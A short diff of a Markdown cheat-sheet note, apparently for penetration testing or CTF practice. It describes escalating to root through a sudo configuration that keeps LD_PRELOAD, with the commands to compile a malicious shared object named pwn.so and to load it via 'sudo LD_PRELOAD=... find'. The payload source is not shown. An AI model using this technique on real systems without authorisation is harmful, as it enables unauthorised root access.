@@ -1,6 +1,10 @@
-# Example
+# LD_PRELOAD
 
-## True positive: env_keep+=LD_PRELOAD
+## Example
+
+### True positive: 
+
+    env_keep+=LD_PRELOAD
 
 ### 1: Check for LD_PRELOAD
 
@@ -8,9 +12,10 @@
 
 ### 3: Run the program with sudo privileges and the LD_PRELOAD option pointing to our .so file
 
+### 1) Compilation
 
-## Compilation
+    gcc -fPIC -shared -o pwn.so pwn.c -nostartfiles
 
-### gcc -fPIC -shared -o pwn.so pwn.c -nostartfiles
+### 2) Usage: 
 
-### Example usage: sudo LD_PRELOAD=/home/user/pwn.so find
+    sudo LD_PRELOAD=/home/user/pwn.so find
